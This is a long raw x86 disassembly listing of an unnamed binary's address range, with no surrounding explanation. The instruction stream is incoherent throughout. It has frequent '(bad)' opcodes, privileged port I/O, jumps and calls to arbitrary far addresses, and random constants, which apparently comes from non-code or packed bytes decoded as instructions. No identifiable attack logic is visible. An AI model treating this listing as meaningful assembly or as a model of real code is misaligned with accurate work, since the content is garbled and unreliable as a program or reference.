  4020e0:	fisub  WORD PTR es:[edi]
  4020e3:	or     eax,0xfafe0fb
  4020e8:	(bad)  
  4020ea:	daa    
  4020eb:	sub    al,0xb8
  4020ed:	retf   
  4020ee:	sbb    esi,DWORD PTR [edx]
  4020f0:	jmp    0x52ca0d83
  4020f5:	xchg   ebx,eax
  4020f6:	les    esi,FWORD PTR [edx]
  4020f8:	cmp    edx,DWORD PTR cs:[ebp-0x7e962974]
  4020ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402100:	imul   ecx,DWORD PTR [ebx],0x5a2c4149
  402106:	test   al,0xa7
  402108:	aad    0x88
  40210a:	jg     0x402148
  40210c:	jg     0x4020b3
  40210e:	aad    0x9
  402110:	mov    ds:0xcc5eaaca,al
  402115:	repz enter 0x25f8,0xe6
  40211a:	mov    DWORD PTR [ecx],ebx
  40211c:	hlt    
  40211d:	aad    0xa7
  40211f:	mov    ebx,0xc3d547b2
  402124:	push   ds
  402125:	jmp    0x40215c
  402127:	xlat   BYTE PTR ds:[ebx]
  402128:	scas   al,BYTE PTR es:[edi]
  402129:	pop    edi
  40212a:	inc    edi
  40212b:	imul   ebp,DWORD PTR [eax],0x11449f38
  402131:	and    eax,0xcd60cc39
  402136:	dec    eax
  402137:	add    al,0x3f
  402139:	rcr    BYTE PTR [ecx],0xb4
  40213c:	or     DWORD PTR [ecx-0x54],eax
  40213f:	loope  0x4020f8
  402141:	mov    bl,0x46
  402143:	mov    ecx,0x2448290a
  402148:	and    al,0x24
  40214a:	fidiv  DWORD PTR [ebp+0x39]
  40214d:	repz mov bl,0xe7
  402150:	aas    
  402151:	(bad)  
  402152:	cld    
  402153:	jmp    0xe16c:0xa810961
  40215a:	push   esp
  40215b:	mov    dh,BYTE PTR [ebx+0x3f]
  40215e:	data16 (bad) 
  402160:	scas   eax,DWORD PTR es:[edi]
  402161:	mov    eax,ds:0x38015915
  402166:	xchg   ecx,eax
  402167:	and    ch,BYTE PTR [eax]
  402169:	ins    BYTE PTR es:[edi],dx
  40216a:	xchg   esp,eax
  40216b:	mov    ecx,DWORD PTR [edx-0x682b2775]
  402171:	lahf   
  402172:	cli    
  402173:	mov    eax,edx
  402175:	and    DWORD PTR [esi+0x3e9bde4e],0xcec4b4be
  40217f:	je     0x4021ed
  402181:	in     eax,0x4
  402183:	enter  0xe0a7,0xd3
  402187:	pop    ss
  402188:	sub    edx,esi
  40218a:	ins    DWORD PTR es:[edi],dx
  40218b:	rcl    DWORD PTR ds:0x91316ef1,1
  402191:	in     eax,0xf6
  402193:	test   al,0xf8
  402195:	jnp    0x40215f
  402197:	(bad)  
  402198:	jno    0x40214b
  40219a:	sbb    cl,0x58
  40219d:	cmp    ebx,DWORD PTR [ecx]
  40219f:	pop    ds
  4021a0:	out    dx,al
  4021a1:	mov    al,0x8a
  4021a3:	call   0xf0cd:0xeaad3c53
  4021aa:	jg     0x402160
  4021ac:	idiv   ch
  4021ae:	gs jo  0x402185
  4021b1:	cmp    eax,0xe2046b4d
  4021b6:	xchg   edx,eax
  4021b7:	cmp    DWORD PTR [edi],esi
  4021b9:	inc    eax
  4021ba:	retf   
  4021bb:	daa    
  4021bc:	into   
  4021bd:	xchg   esp,eax
  4021be:	mov    edi,DWORD PTR [edi]
  4021c0:	inc    esi
  4021c1:	xor    BYTE PTR [ebx-0x751989f0],al
  4021c7:	push   ecx
  4021c8:	stos   BYTE PTR es:[edi],al
  4021c9:	sub    BYTE PTR [ecx+0x10122c41],bl
  4021cf:	icebp  
  4021d0:	inc    ebx
  4021d1:	dec    ebx
  4021d2:	imul   ebp,ecx,0xce3ce7a7
  4021d8:	push   ecx
  4021d9:	mov    eax,0x4b8973d9
  4021de:	ror    ch,1
  4021e0:	jo     0x4021ed
  4021e2:	xchg   esp,eax
  4021e3:	ficom  WORD PTR [esi+edx*2]
  4021e6:	sbb    ebx,DWORD PTR [ecx]
  4021e8:	sub    eax,0x17e8a865
  4021ed:	in     eax,0xdf
  4021ef:	mov    cl,0x24
  4021f1:	jmp    0x402203
  4021f3:	jmp    0x402270
  4021f5:	in     eax,0x5b
  4021f7:	mov    edx,0x1b8358e1
  4021fc:	jae    0x4021cf
  4021fe:	ds adc ebx,ebx
  402201:	pop    ebx
  402202:	sub    dh,ch
  402204:	sbb    al,0xc3
  402206:	jno    0x4021b0
  402208:	mov    bl,0x78
  40220a:	into   
  40220b:	icebp  
  40220c:	xor    BYTE PTR [ebp-0x477bbb1b],0xb5
  402213:	and    BYTE PTR [edx-0x3e4d90d4],ch
  402219:	mov    bh,0x5f
  40221b:	inc    eax
  40221c:	add    DWORD PTR [edi+ecx*8-0x384e599],edi
  402223:	scas   eax,DWORD PTR es:[edi]
  402224:	rcr    DWORD PTR [ebp+0x1323d2d9],1
  40222a:	arpl   WORD PTR [edi+0x5f6aa7d0],dx
  402230:	fbstp  TBYTE PTR [eax+0x3d]
  402233:	lds    eax,FWORD PTR [ebx-0x5f83bd50]
  402239:	mov    bl,0x41
  40223b:	out    0x84,al
  40223d:	add    BYTE PTR cs:[edi],ch
  402240:	into   
  402241:	mov    ds:0xc2d92175,eax
  402246:	sahf   
  402247:	sub    ebx,DWORD PTR [ecx-0x5]
  40224a:	sub    DWORD PTR [eax-0x5d],ebx
  40224d:	cmp    eax,0xd3a9a3dd
  402252:	or     edi,DWORD PTR [edi-0x15fbf7eb]
  402258:	or     DWORD PTR [eax+0x4f8bfeaa],esi
  40225e:	jae    0x4022d9
  402260:	dec    edx
  402261:	lds    edx,FWORD PTR [esp+ecx*8]
  402264:	repz out 0x17,eax
  402267:	cmp    DWORD PTR [esi],0xe82bd4f9
  40226d:	cli    
  40226e:	into   
  40226f:	adc    DWORD PTR ds:0xecf72c46,ebx
  402275:	jae    0x4022c2
  402277:	gs sbb al,0x2b
  40227a:	sbb    BYTE PTR [ecx+eax*8],bh
  40227d:	push   esi
  40227e:	pop    esi
  40227f:	mov    ds:0x5572a658,eax
  402284:	seto   cl
  402287:	pop    ebp
  402288:	pop    esp
  402289:	int3   
  40228a:	nop
  40228b:	jbe    0x4022e0
  40228d:	jmp    0x4022ed
  40228f:	je     0x402276
  402291:	hlt    
  402292:	inc    edx
  402293:	fnstenv [ecx]
  402295:	pop    eax
  402296:	inc    edx
  402297:	mov    ds:0x672fa014,al
  40229c:	jp     0x4022e9
  40229e:	mov    edx,0xb1eef34b
  4022a3:	xchg   ebp,eax
  4022a4:	mov    eax,ds:0x893611c8
  4022a9:	dec    ebx
  4022aa:	and    al,0x81
  4022ac:	push   edx
  4022ad:	push   ds
  4022ae:	jne    0x402261
  4022b0:	int3   
  4022b1:	cmp    eax,0x32fd2194
  4022b6:	pop    ebp
  4022b7:	jb     0x4022da
  4022b9:	add    DWORD PTR [eax-0xfb10dae],ecx
  4022bf:	or     al,0x9e
  4022c1:	rcr    DWORD PTR [ebx+0x10cef2eb],cl
  4022c7:	xchg   edx,eax
  4022c8:	ins    BYTE PTR es:[edi],dx
  4022c9:	sub    ah,BYTE PTR [ebx-0x70]
  4022cc:	jmp    0xa28b5e72
  4022d1:	fdivr  DWORD PTR [ecx]
  4022d3:	dec    esi
  4022d4:	mov    cl,0xfe
  4022d6:	sbb    edx,ecx
  4022d8:	iret   
  4022d9:	outs   dx,DWORD PTR ds:[esi]
  4022da:	call   FWORD PTR [edx]
  4022dc:	pop    ds
  4022dd:	jl     0x4022a4
  4022df:	sub    BYTE PTR [ecx],0xe8
  4022e2:	push   ds
  4022e3:	mov    BYTE PTR [edx],cl
  4022e5:	in     al,0xcc
  4022e7:	(bad)  
  4022e8:	sbb    BYTE PTR [ecx+0x31b9a6a2],dh
  4022ee:	jnp    0x402285
  4022f0:	ret    
  4022f1:	outs   dx,BYTE PTR ds:[esi]
  4022f2:	or     DWORD PTR [ebx+0x33],0xd02367d9
  4022f9:	out    0x8b,al
  4022fb:	neg    DWORD PTR [edx+eax*4]
  4022fe:	rcr    DWORD PTR [ebx+0x5f033989],0xd4
  402305:	sahf   
  402306:	lods   al,BYTE PTR ds:[esi]
  402307:	adc    DWORD PTR [ebx-0x75e17e2e],0x57fb9ac3
  402311:	loop   0x402379
  402313:	push   edx
  402314:	mov    ebp,0x357758b8
  402319:	mov    DWORD PTR [ebx+0x2fb4058d],edi
  40231f:	xor    eax,0x55df7fbc
  402324:	pop    esp
  402325:	arpl   WORD PTR [ebp+0x12529ff8],cx
  40232b:	mov    edi,fs
  40232d:	outs   dx,BYTE PTR ds:[esi]
  40232e:	xor    BYTE PTR [edx-0x67ca9fa9],al
  402334:	xchg   ecx,eax
  402335:	jmp    0x6d39314d
  40233a:	mov    edi,eax
  40233c:	mov    ebx,0x68f27bc3
  402341:	in     eax,0x9d
  402343:	enter  0x6f49,0x1e
  402347:	pop    ss
  402348:	xor    esp,DWORD PTR [esi+0x7fc67393]
  40234e:	cmp    al,bl
  402350:	sbb    bh,BYTE PTR [ebp+0x66]
  402353:	imul   edi,DWORD PTR ds:0x2b95,0x23965fdf
  40235c:	out    dx,eax
  40235d:	push   eax
  40235e:	lods   al,BYTE PTR ds:[esi]
  40235f:	jle    0x402397
  402361:	push   eax
  402362:	sub    al,0xf7
  402364:	ss push 0xffffff9e
  402367:	popa   
  402368:	lods   eax,DWORD PTR ds:[esi]
  402369:	out    dx,eax
  40236a:	cmp    al,0x8f
  40236c:	fwait
  40236d:	dec    esi
  40236e:	in     eax,0x40
  402370:	(bad)  
  402371:	rcr    DWORD PTR [edi-0x2c],1
  402374:	cld    
  402375:	adc    BYTE PTR [eax-0x44e53980],cl
  40237b:	outs   dx,BYTE PTR ds:[esi]
  40237c:	mov    al,0xf2
  40237e:	ja     0x4023cb
  402380:	or     DWORD PTR [ebx+0x6896395c],ecx
  402386:	jge    0x40233d
  402388:	test   DWORD PTR [ebp+0x654c5b1d],esp
  40238e:	mov    ah,BYTE PTR [ebp+0x17]
  402391:	aas    
  402392:	cmp    DWORD PTR [edx-0x2a526a20],edx
  402398:	or     DWORD PTR [ebp-0x38cf7f09],ebp
  40239e:	out    0xed,eax
  4023a0:	inc    esi
  4023a1:	sub    eax,0xb33a986
  4023a6:	retf   0x1d1f
  4023a9:	xchg   ebp,eax
  4023aa:	sbb    WORD PTR ds:[esi],0x7348
  4023b0:	in     al,dx
  4023b1:	leave  
  4023b2:	dec    eax
  4023b3:	xchg   esp,eax
  4023b4:	das    
  4023b5:	jb     0x40234f
  4023b7:	mov    ds:0xf12a6e95,eax
  4023bc:	push   es
  4023bd:	xchg   esp,eax
  4023be:	out    0xa7,eax
  4023c0:	out    0xa8,al
  4023c2:	rol    DWORD PTR [ebp-0x4b],1
  4023c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023c6:	dec    edi
  4023c7:	and    eax,0x2116178f
  4023cc:	jmp    0x6860:0x548630ca
  4023d3:	addr16 jge 0x402383
  4023d6:	int    0x7e
  4023d8:	int3   
  4023d9:	xchg   ecx,eax
  4023da:	fadd   st,st(5)
  4023dc:	dec    esi
  4023dd:	adc    BYTE PTR [ecx+0x5f],cl
  4023e0:	(bad)  
  4023e1:	mov    edx,0x3b8b858e
  4023e6:	sub    ebx,DWORD PTR [edx-0x66]
  4023e9:	sub    al,0xbb
  4023eb:	pop    ecx
  4023ec:	scas   eax,DWORD PTR es:[edi]
  4023ed:	lock jl 0x4023dc
  4023f0:	mov    ebx,ecx
  4023f2:	shr    BYTE PTR [edi],1
  4023f4:	popf   
  4023f5:	lods   eax,DWORD PTR ds:[esi]
  4023f6:	push   esp
  4023f7:	push   ecx
  4023f8:	cmp    DWORD PTR [ebp+0x571d786e],esp
  4023fe:	fcom   QWORD PTR [edx+ebp*1]
  402401:	push   cs
  402402:	retf   
  402403:	inc    ecx
  402404:	test   BYTE PTR [ecx],0xd0
  402407:	pop    ss
  402408:	arpl   WORD PTR [ecx+ebp*4-0x28],ax
  40240c:	out    0x1a,eax
  40240e:	dec    edx
  40240f:	sub    edx,eax
  402411:	dec    esp
  402412:	mov    esi,DWORD PTR [edx+0xf]
  402415:	out    0xdb,eax
  402417:	add    BYTE PTR [ebx-0xcf150c4],al
  40241d:	dec    dx
  40241f:	mov    dl,0x9f
  402421:	push   ebp
  402422:	in     al,dx
  402423:	push   es
  402424:	fxch   st(7)
  402426:	jecxz  0x4023cc
  402428:	mov    edi,DWORD PTR [edi+esi*4]
  40242b:	popf   
  40242c:	(bad)  
  40242d:	and    bl,BYTE PTR [eax-0xc59d35c]
  402433:	mov    ebx,0xbe8a782b
  402438:	ror    DWORD PTR [eax],cl
  40243a:	jmp    0x4024a5
  40243c:	(bad)
  40243f:	xchg   ecx,eax
  402440:	fwait
  402441:	cmp    DWORD PTR [esi],esp
  402443:	mov    bl,0xd0
  402445:	iret   
  402446:	add    DWORD PTR [ecx-0x31],ebp
  402449:	pop    ebp
  40244a:	mov    dl,0x9d
  40244c:	(bad)  
  40244d:	js     0x402476
  40244f:	ds mov ebx,0x8db09ed6
  402455:	test   al,0x5c
  402457:	popf   
  402458:	in     eax,0xe5
  40245a:	dec    edi
  40245b:	iret   
  40245c:	(bad)  
  40245e:	and    BYTE PTR [edx-0x17],dh
  402461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402462:	mov    eax,ds:0x98b61f59
  402467:	out    dx,eax
  402468:	dec    esi
  402469:	mov    WORD PTR [edi-0x6c507bcd],?
  40246f:	cld    
  402470:	mov    edx,0x7787a24e
  402475:	ins    DWORD PTR es:[edi],dx
  402476:	outs   dx,BYTE PTR ds:[esi]
  402477:	ds in  eax,dx
  402479:	pop    esi
  40247a:	and    DWORD PTR [eax],0x7155a977
  402480:	pop    ebp
  402481:	xchg   BYTE PTR [esi],bh
  402483:	push   es
  402484:	and    al,0xd1
  402486:	cmc    
  402487:	sti    
  402488:	xchg   esi,eax
  402489:	pop    ecx
  40248a:	xor    DWORD PTR [ebp+0x56],ebx
  40248d:	dec    esp
  40248e:	dec    ecx
  40248f:	xchg   ecx,eax
  402490:	cmp    DWORD PTR [ebp+edi*2-0xf51092e],0xffffff9a
  402498:	popa   
  402499:	inc    edi
  40249a:	in     eax,0xb7
  40249c:	mov    ecx,0x5d38b340
  4024a1:	mov    ch,0x3b
  4024a3:	ss jmp 0x4024ba
  4024a6:	rol    DWORD PTR ds:0xc736972e,cl
  4024ac:	std    
  4024ad:	xor    ch,dl
  4024af:	cmp    al,0xc8
  4024b1:	lock addr16 fxch st(0)
  4024b5:	sahf   
  4024b6:	xor    dl,BYTE PTR [ebx]
  4024b8:	xor    al,0x66
  4024ba:	xchg   BYTE PTR [esi],bl
  4024bc:	add    ah,bh
  4024be:	out    dx,eax
  4024bf:	inc    edx
  4024c0:	push   edx
  4024c1:	jge    0x4024c9
  4024c3:	repz cmp ebx,DWORD PTR [ebp+0x3c16f247]
  4024ca:	cdq    
  4024cb:	ds push ds
  4024cd:	mov    bl,0xae
  4024cf:	cdq    
  4024d0:	mov    DWORD PTR [ecx],ebx
  4024d2:	cmc    
  4024d3:	stos   DWORD PTR es:[edi],eax
  4024d4:	sbb    eax,0xc6ac1e4c
  4024d9:	and    DWORD PTR [ecx],edx
  4024db:	jo     0x402520
  4024dd:	lahf   
  4024de:	pop    ds
  4024df:	les    eax,FWORD PTR [ebx+0x49916e12]
  4024e5:	out    0xd9,al
  4024e7:	sbb    DWORD PTR [eax],edi
  4024e9:	lock ret 
  4024eb:	sbb    ecx,edx
  4024ed:	fld    DWORD PTR [ecx]
  4024ef:	jmp    0xa37c:0x4e04fc14
  4024f6:	dec    ebx
  4024f7:	and    al,al
  4024f9:	dec    eax
  4024fa:	ss dec eax
  4024fc:	int    0x36
  4024fe:	push   ebx
  4024ff:	add    dl,dh
  402501:	int3   
  402502:	clc    
  402503:	add    al,BYTE PTR [ecx-0x29]
  402506:	pop    edi
  402507:	xchg   esi,eax
  402508:	aas    
  402509:	push   es
  40250a:	cmp    edx,DWORD PTR [ebp+ebx*1-0xe]
  40250e:	out    0x7e,al
  402510:	mov    esi,DWORD PTR [edi+0x6b35df4f]
  402516:	loope  0x402528
  402518:	add    BYTE PTR [eax-0x47],ch
  40251b:	xor    BYTE PTR ds:0x607b53fa,0xcc
  402522:	sub    DWORD PTR [eax-0x4f4376f4],ebp
  402528:	stos   DWORD PTR es:[edi],eax
  402529:	into   
  40252a:	or     al,0xca
  40252c:	clc    
  40252d:	out    0xf4,eax
  40252f:	rol    DWORD PTR [esi+0x7a],0xef
  402533:	and    DWORD PTR ds:0xa2c25c1c,esp
  402539:	mov    edx,0x16e218ec
  40253e:	fwait
  40253f:	pop    ds
  402540:	add    BYTE PTR [ecx+0x76],ch
  402543:	das    
  402544:	and    eax,0x14ecec59
  402549:	add    BYTE PTR [eax+edi*8+0xa63967e],bh
  402550:	cli    
  402551:	mov    WORD PTR [eax-0xb],ss
  402554:	adc    eax,0x30e999ac
  402559:	pushf  
  40255a:	imul   ebx,DWORD PTR ds:0x86b6c19f,0x2f
  402561:	mul    esi
  402563:	adc    BYTE PTR [edi-0x4b],dh
  402566:	repnz push es
  402568:	or     BYTE PTR [edi+0x13e50c24],0x80
  40256f:	xor    al,0xa1
  402571:	in     al,0x26
  402573:	push   ss
  402574:	and    eax,0xafa33d2c
  402579:	add    al,0xa4
  40257b:	push   0xd923a6fb
  402580:	mov    ebp,0xea0f2850
  402585:	aas    
  402586:	rcl    DWORD PTR [edx+ecx*4+0x71],cl
  40258a:	mov    ebp,0x527f4e1d
  40258f:	sub    eax,0x6b7b45f2
  402594:	push   eax
  402595:	daa    
  402596:	ficom  WORD PTR [edx]
  402598:	push   0x857399dc
  40259d:	bound  edi,QWORD PTR [ecx]
  40259f:	adc    ebp,ecx
  4025a1:	cmc    
  4025a2:	in     al,0xef
  4025a4:	adc    DWORD PTR [esi-0x3b],ecx
  4025a7:	retf   
  4025a8:	xor    DWORD PTR [ebx+eax*8+0x50],esi
  4025ac:	xor    ecx,DWORD PTR [edx]
  4025ae:	or     al,0xf9
  4025b0:	lds    ebx,FWORD PTR [ecx+0x2c]
  4025b3:	sbb    edi,edx
  4025b5:	or     esp,ebp
  4025b7:	push   ebp
  4025b8:	jle    0x402559
  4025ba:	sbb    DWORD PTR [edi],0xffffffb5
  4025bd:	sbb    eax,0x4cefe16a
  4025c2:	or     eax,DWORD PTR [esi]
  4025c4:	hlt    
  4025c5:	out    0xd3,al
  4025c7:	aam    0xbd
  4025c9:	rol    BYTE PTR [ecx+0x505bc6fc],0xb9
  4025d0:	cmp    DWORD PTR ds:0xb04d1e1d,0xe3560095
  4025da:	mov    edi,0x4cfec4bc
  4025df:	cmp    al,0xd1
  4025e1:	gs mov ebp,edx
  4025e4:	hlt    
  4025e5:	mov    ch,0x83
  4025e7:	cmovge ecx,edi
  4025ea:	int    0xbe
  4025ec:	jle    0x4025e0
  4025ee:	mul    esp
  4025f0:	fucomi st,st(3)
  4025f2:	pop    es
  4025f3:	add    al,0xec
  4025f5:	aam    0xe5
  4025f7:	test   eax,0x234c46ad
  4025fc:	fwait
  4025fd:	inc    esp
  4025fe:	jnp    0x402656
  402600:	sbb    eax,0x4a3ef1e1
  402605:	ror    BYTE PTR [edi-0x6e9b962c],0x8a
  40260c:	int3   
  40260d:	sbb    al,0xf5
  40260f:	ret    0xb53c
  402612:	xchg   ecx,eax
  402613:	and    ecx,DWORD PTR [ebp+0xcc02bc5]
  402619:	(bad)  
  40261a:	rcl    BYTE PTR [esi],1
  40261c:	sahf   
  40261d:	out    dx,al
  40261e:	mov    edi,0x98c6da31
  402623:	jl     0x402626
  402625:	mov    esp,DWORD PTR [edi]
  402627:	out    0x28,al
  402629:	mov    eax,ds:0x889a46f9
  40262e:	fistp  WORD PTR [eax-0x74]
  402631:	xchg   ebp,eax
  402632:	sar    ecx,0x1e
  402635:	and    edx,DWORD PTR [eax]
  402637:	stos   DWORD PTR es:[edi],eax
  402638:	into   
  402639:	sbb    BYTE PTR [ebp+eax*1+0x7a],dh
  40263d:	pop    esi
  40263e:	xor    al,0xf4
  402640:	jbe    0x402675
  402642:	mov    bh,0x80
  402644:	scas   al,BYTE PTR es:[edi]
  402645:	imul   eax,DWORD PTR [edi-0x6a],0xffffffa1
  402649:	lock pop esp
  40264b:	fiadd  WORD PTR [ecx-0x62]
  40264e:	(bad)
  402651:	jbe    0x4026b3
  402653:	xchg   ebp,eax
  402654:	dec    edi
  402655:	push   ebp
  402656:	sbb    eax,0xba45cf1e
  40265b:	adc    al,0xb7
  40265d:	dec    ecx
  40265e:	setae  BYTE PTR [eax+0x5e]
  402662:	jmp    0x402667
  402664:	pop    es
  402665:	test   eax,0xa2a568c8
  40266a:	xchg   ebp,eax
  40266b:	xchg   ecx,eax
  40266c:	call   0xe4c0:0x8e72b091
  402673:	(bad)  
  402674:	mov    esp,0xde772912
  402679:	inc    eax
  40267a:	add    dl,ch
  40267c:	mov    ecx,0x67c9de2
  402681:	xchg   ebx,eax
  402682:	ss aad 0x2e
  402685:	aaa    
  402686:	inc    esp
  402687:	lock in eax,dx
  402689:	dec    esi
  40268a:	mov    esi,DWORD PTR [esi+0xd]
  40268d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40268e:	cmp    DWORD PTR [ecx+ecx*2+0x1d63aa74],eax
  402695:	bound  ebp,QWORD PTR [edi-0x68]
  402698:	out    dx,eax
  402699:	mov    bh,0x96
  40269b:	lock es fxtract 
  40269f:	es jge 0x40268a
  4026a2:	out    0xc2,eax
  4026a4:	inc    edx
  4026a5:	int    0xd4
  4026a7:	stc    
  4026a8:	or     eax,0x7c9ad7a2
  4026ad:	aam    0xa7
  4026af:	pop    eax
  4026b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026b1:	std    
  4026b2:	mov    ebx,0x89412f7e
  4026b7:	(bad)  [edi-0x734dc92d]
  4026bd:	fcomp  QWORD PTR [ebx]
  4026bf:	or     DWORD PTR gs:[esi+0x3a],esi
  4026c3:	lods   eax,DWORD PTR ds:[esi]
  4026c4:	test   ebx,ebx
  4026c6:	imul   bp,WORD PTR [ebp-0x7f],0xe
  4026cb:	sbb    BYTE PTR [ecx-0x11c1fc9a],bl
  4026d1:	test   DWORD PTR [edx],edx
  4026d3:	outs   dx,BYTE PTR ds:[esi]
  4026d4:	(bad)  
  4026d5:	(bad)  
  4026d6:	jmp    0x82226f92
  4026db:	mov    ds,WORD PTR [edi+eax*8+0x69]
  4026df:	ins    DWORD PTR es:[edi],dx
  4026e0:	jg     0x4026a4
  4026e2:	or     ebx,edi
  4026e4:	loop   0x402722
  4026e6:	popa   
  4026e7:	scas   eax,DWORD PTR es:[edi]
  4026e8:	call   0xca54:0x5afa7e67
  4026ef:	pop    ss
  4026f0:	retf   0x95eb
  4026f3:	dec    eax
  4026f4:	dec    edi
  4026f5:	arpl   WORD PTR [eax-0x4be2bc04],ax
  4026fb:	dec    eax
  4026fc:	xor    al,0xca
  4026fe:	int    0xcb
  402700:	iret   
  402701:	(bad)  
  402702:	int3   
  402703:	lock mov esi,0x9847bdcb
  402709:	ds call 0x5fc0b9d3
  40270f:	mov    al,ds:0x94e3849c
  402714:	arpl   cx,di
  402716:	aam    0x2b
  402718:	and    bh,al
  40271a:	push   edi
  40271b:	inc    ebp
  40271c:	inc    esi
  40271d:	xlat   BYTE PTR ds:[ebx]
  40271e:	add    al,0xf4
  402720:	push   edx
  402721:	push   ebx
  402722:	retf   0x774d
  402725:	push   ecx
  402726:	les    ebp,FWORD PTR [eax]
  402728:	adc    DWORD PTR [ecx-0x7f23bdcb],ebp
  40272e:	and    edi,DWORD PTR [ecx-0x69]
  402731:	das    
  402732:	fmul   st(2),st
  402734:	push   0xd8503a4f
  402739:	inc    esp
  40273a:	inc    ebx
  40273b:	enter  0x94af,0x2c
  40273f:	rol    DWORD PTR [edi],0x53
  402742:	ins    BYTE PTR es:[edi],dx
  402743:	jge    0x402736
  402745:	mov    ebp,0xaf0f22e0
  40274a:	out    0xe4,al
  40274c:	inc    ecx
  40274d:	lds    esi,FWORD PTR [ebp+0x39055cc9]
  402753:	mov    al,0xe5
  402755:	outs   dx,BYTE PTR ds:[esi]
  402756:	and    eax,0xf56616ad
  40275b:	cld    
  40275c:	shl    al,cl
  40275e:	xchg   edi,eax
  40275f:	dec    edi
  402760:	dec    ebp
  402761:	mov    bh,0x89
  402763:	pop    esp
  402764:	jbe    0x4027a6
  402766:	sbb    DWORD PTR cs:[eax-0xf],ebx
  40276a:	cmp    DWORD PTR [ebx+0x7b1b2400],ecx
  402770:	sub    eax,0x826b1508
  402775:	dec    ebp
  402776:	pop    ss
  402777:	loope  0x40270e
  402779:	jl     0x40273a
  40277b:	sbb    eax,0x5196ad42
  402780:	and    BYTE PTR [ebx],cl
  402782:	out    0x41,al
  402784:	mov    ecx,0xae68215e
  402789:	out    dx,eax
  40278a:	jno    0x40278a
  40278c:	sub    eax,DWORD PTR [esi+edi*1+0x58]
  402790:	adc    ah,bh
  402792:	dec    eax
  402793:	je     0x402779
  402795:	jae    0x4027fd
  402797:	mov    bl,0xd4
  402799:	jle    0x402737
  40279b:	xchg   esp,eax
  40279c:	or     DWORD PTR [edi+0x46304311],esp
  4027a2:	ror    BYTE PTR [ebp-0x4a],cl
  4027a5:	pop    edx
  4027a6:	xchg   ebp,ecx
  4027a8:	fcom   DWORD PTR [esp+ebx*1-0x24]
  4027ac:	push   edx
  4027ad:	test   BYTE PTR [ecx],dl
  4027af:	repz dec ecx
  4027b1:	xor    edx,DWORD PTR [ebx+0x6]
  4027b4:	adc    eax,0xea5d1f43
  4027b9:	int    0xba
  4027bb:	dec    esi
  4027bc:	adc    bh,bl
  4027be:	push   ss
  4027bf:	sbb    al,0xaa
  4027c1:	data16 idiv BYTE PTR [ecx+0x3c2ad783]
  4027c8:	adc    ah,BYTE PTR [ecx]
  4027ca:	inc    ebx
  4027cb:	int    0x5
  4027cd:	push   ss
  4027ce:	shl    ecx,1
  4027d0:	pop    edi
  4027d1:	ficomp WORD PTR [ebx+edi*8+0x345458fe]
  4027d8:	scas   al,BYTE PTR es:[edi]
  4027d9:	mov    eax,0x7e8d5086
  4027de:	jle    0x4027a8
  4027e0:	into   
  4027e1:	sub    esp,ecx
  4027e3:	aam    0xe8
  4027e5:	test   DWORD PTR [ebp+0x2467ad26],ebp
  4027eb:	jle    0x40284b
  4027ed:	fst    DWORD PTR [edx-0x3a]
  4027f0:	jge    0x402801
  4027f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027f3:	dec    ebx
  4027f4:	mov    BYTE PTR [ecx+0x78],ch
  4027f7:	xchg   DWORD PTR [ebp+0x53e8817c],edi
  4027fd:	scas   al,BYTE PTR es:[edi]
  4027fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027ff:	add    BYTE PTR [edi],dl
  402801:	jg     0x402852
  402803:	dec    esp
  402804:	leave  
  402805:	stos   BYTE PTR es:[edi],al
  402806:	inc    esi
  402807:	pusha  
  402808:	fnstcw WORD PTR [ecx]
  40280a:	fisttp QWORD PTR [ecx-0x761e58f4]
  402810:	sahf   
  402811:	(bad)  [ecx-0x9244b78]
  402817:	(bad)  
  402818:	popf   
  402819:	int    0xd
  40281b:	or     al,0x0
  40281d:	or     al,0xd
  40281f:	and    eax,0x59f626d0
  402824:	out    dx,al
  402825:	and    al,0x1b
  402827:	retf   0xcd8
  40282a:	mov    WORD PTR [edi+0x27],es
  40282d:	mov    bh,0xa9
  40282f:	dec    edx
  402830:	ins    BYTE PTR es:[edi],dx
  402831:	out    dx,al
  402832:	cdq    
  402833:	pusha  
  402834:	add    eax,0xe09217a0
  402839:	cmp    ch,BYTE PTR [edi+eiz*4+0x70]
  40283d:	test   eax,0x4a34b213
  402842:	retf   
  402843:	jl     0x40281a
  402845:	hlt    
  402846:	int    0x40
  402848:	rcr    DWORD PTR [ecx-0x5b],0xa6
  40284c:	xchg   ecx,eax
  40284d:	jae    0x4028c0
  40284f:	mov    esi,DWORD PTR [ebx-0x59]
  402852:	mov    ds:0x9cdbf7bb,al
  402857:	fcmovnb st,st(4)
  402859:	mov    dh,0xb6
  40285b:	add    dh,BYTE PTR [edi-0x37]
  40285e:	sub    al,0xaa
  402860:	int3   
  402861:	xchg   BYTE PTR [eax],ch
  402863:	sahf   
  402864:	cmp    esp,edx
  402866:	mov    BYTE PTR [ebx],ah
  402868:	les    edx,FWORD PTR [ecx]
  40286a:	pushf  
  40286b:	xlat   BYTE PTR ds:[ebx]
  40286c:	inc    edx
  40286d:	in     eax,dx
  40286e:	inc    edx
  40286f:	lods   al,BYTE PTR ds:[esi]
  402870:	and    al,0x1
  402872:	lods   eax,DWORD PTR ds:[esi]
  402873:	int    0xe5
  402875:	adc    al,0x77
  402877:	and    ch,BYTE PTR [ecx-0x6d03249a]
  40287d:	inc    esp
  40287e:	aaa    
  40287f:	jnp    0x402890
  402881:	sub    al,BYTE PTR [esi+ebp*2+0x7b1b5f89]
  402888:	push   ax
  40288a:	cmp    ah,dl
  40288c:	mov    bh,0xfe
  40288e:	aaa    
  40288f:	jle    0x40288e
  402891:	pop    es
  402892:	xchg   bh,ah
  402894:	rol    DWORD PTR [ecx+0x4a],cl
  402897:	jg     0x4028a3
  402899:	adc    al,0xa6
  40289b:	add    eax,0x1fed6cbc
  4028a0:	or     al,BYTE PTR [edi+0x45]
  4028a3:	mov    eax,0xcedfdeac
  4028a8:	test   eax,0x62209631
  4028ad:	loop   0x402851
  4028af:	dec    ecx
  4028b0:	shl    DWORD PTR [ebx-0x52],1
  4028b3:	add    esi,esi
  4028b5:	cmp    BYTE PTR [ebx+0x2e73119f],cl
  4028bb:	in     al,0xc7
  4028bd:	mov    ah,0xd7
  4028bf:	add    DWORD PTR [edx],esp
